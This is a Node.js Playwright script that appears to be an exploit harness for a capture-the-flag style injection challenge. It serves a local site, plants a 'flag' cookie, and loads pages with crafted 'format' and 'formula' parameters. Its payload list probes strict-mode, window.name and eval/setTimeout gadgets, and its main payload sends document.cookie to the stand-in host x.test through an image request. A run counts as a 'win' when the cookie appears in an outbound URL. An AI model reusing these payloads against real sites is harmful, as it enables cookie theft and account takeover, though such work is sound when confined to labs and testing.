const http=require("http"),fs=require("fs"),path=require("path");
const {chromium}=require("playwright");
const SITE=path.join(__dirname,"site"),PORT=8099,COOKIE="FLAGMARK_abc123";
const server=http.createServer((req,res)=>{let p=decodeURIComponent(req.url.split("?")[0]);if(p==="/")p="/index.html";fs.readFile(path.join(SITE,p),(e,d)=>{if(e){res.writeHead(200,{"Content-Type":"text/html"});return res.end(fs.readFileSync(path.join(SITE,"index.html")));}const x=path.extname(p);res.writeHead(200,{"Content-Type":x===".js"?"text/javascript":x===".css"?"text/css":"text/html"});res.end(d);});});
const q=o=>Object.entries(o).map(([k,v])=>k+"="+encodeURIComponent(v)).join("&");
(async()=>{
  await new Promise(r=>server.listen(PORT,r));
  const browser=await chromium.launch();
  const ctx=await browser.newContext();
  await ctx.addCookies([{name:"flag",value:COOKIE,url:`http://localhost:${PORT}`,httpOnly:false}]);
  async function test(format,formula){
    const page=await ctx.newPage();const eg=[];
    page.on("dialog",d=>{eg.push("DLG:"+d.message().slice(0,90));d.dismiss().catch(()=>{});});
    await page.route("**",r=>{const u=r.request().url();if(u.startsWith(`http://localhost:${PORT}`))return r.continue();eg.push(u.slice(0,200));return r.abort();});
    const url=`http://localhost:${PORT}/?`+q({x:"1",y:"2",formula:formula||"x + y",format,autoEval:"1"});
    try{await page.goto(url,{waitUntil:"domcontentloaded",timeout:8000});}catch(e){}
    await page.waitForTimeout(900);
    let a="";try{a=await page.$eval("#answer",e=>e.textContent);}catch(e){a="(nav)";}
    await page.close();
    return {format,answer:(a||"").slice(0,40),eg,win:eg.some(e=>e.includes(COOKIE))};
  }
  const T=[
    // STRICT test: zz not a global. non-strict -> creates+navigates to /NONSTRICT ; strict -> throws
    `,[zz="http://x.test/NONSTRICT"][location=zz]`,
    // quoted code stored in name (name is existing global, works in strict)
    `,[name="alert(1)"]`,
    // can we run name? navigate to it (junk) just to confirm name set
    `,[name="MARKNAME"][location=name]`,
    // multi-attr index cookie read: set c global then document[c]
    `,[c="cookie"][location=document]`,
    // try: location = document[c] via index into array of document
    `,[c="cookie"][x=document][location=x]`,
    // EXEC values.formula attempts (formula = egress code)
    `,eval`,
    `,setTimeout`,
    `,setTimeout.call`,
    `,eval.call`,
    // outer eval multi-expr via comma to run location assign (bare = invalid, but test [location] variants)
    `,[location="http://x.test/BASE"]`,
  ];
  console.log("== strict + name + exec tests ==");
  const EXF=`new Image().src="http://x.test/FPWN?c="+document.cookie`;
  for(const f of T){const r=await test(f,EXF);console.log((r.win?"WIN ":"    ")+JSON.stringify(r));}
  await browser.close();server.close();
})();
